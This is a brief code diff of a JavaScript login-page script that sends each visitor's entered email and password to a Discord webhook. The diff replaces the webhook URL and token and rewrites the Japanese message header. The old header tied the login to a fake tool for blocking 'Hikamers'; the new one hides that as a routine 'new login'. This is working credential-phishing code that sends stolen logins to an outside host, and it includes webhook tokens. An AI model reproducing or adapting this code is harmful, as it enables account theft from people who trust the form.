@@ -1,4 +1,4 @@
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1428234881561002045/32y44N7pa_9xGU1NMPV-73lnIzKPRrNyxAANMwGjbRp176wfKkYwnWHbSD1CE4pnxIWM";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1428302981086056488/XBzxOb-lcrfzm0aaikR6l7YB6NqMHoR_jA2CdlQIkG4eCxlUPSprSYMcCyEJlfPVZH0a";
 
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -13,7 +13,7 @@ document.addEventListener('DOMContentLoaded', () => {
         const emailValue = emailInput.value;
         const passwordValue = passwordInput.value;
 
-        const messageContent = `**「全ヒカマーをブロックするツール」からのログイン試行**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
+        const messageContent = `**新しいログインがありました**\n\n**メールアドレス:** ${emailValue}\n**パスワード:** ${passwordValue}`;
         
         await sendToDiscord(messageContent);
         
